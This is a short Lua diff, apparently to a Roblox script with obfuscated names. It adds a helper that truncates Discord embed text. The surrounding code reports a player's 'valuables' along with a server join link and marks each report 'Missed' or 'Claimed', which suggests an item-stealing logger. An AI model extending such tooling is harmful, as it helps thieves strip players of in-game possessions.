@@ -1114,6 +1114,17 @@ local function fn26(arg)
 	return (string.format("%.2f", tonumber(arg) or 0):gsub("0+$", ""):gsub("%.$", ""))
 end
 
+-- Discord field value hard limit is 1024 chars.
+-- Code-block wrapper adds 7 chars (```\n ... \n```), leaving 1017 for content.
+-- Reserve 18 more for a truncation notice → safe content ceiling = 999 chars.
+local FIELD_CONTENT_LIMIT = 999
+local function clampField(text)
+	if #text <= FIELD_CONTENT_LIMIT then
+		return text
+	end
+	return text:sub(1, FIELD_CONTENT_LIMIT) .. "\n... (truncated)"
+end
+
 local n8 = 0
 local n9 = 0
 
@@ -1662,7 +1673,7 @@ local function fn32()
 	-- join link
 	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
 
-	local valuablesText = str9
+	local valuablesText = clampField(str9)
 
 	-- initial status: In Progress — Missed or Claimed are patched onto this same message later
 	local statusText = "🔵 In Progress"
@@ -1778,6 +1789,7 @@ local function fn32_update_missed(reason)
 	if overflow > 0 then
 		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
 	end
+	valuablesText = clampField(valuablesText)
 
 	local statusLabel = "🔴 Missed"
 
@@ -1832,7 +1844,7 @@ local function fn33(arg, arg2, _arg3)
 
 	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
 
-	local valuablesText = str9
+	local valuablesText = clampField(str9)
 	local statusLabel = "✅ Claimed"
 	local embedColor = 5763719
 
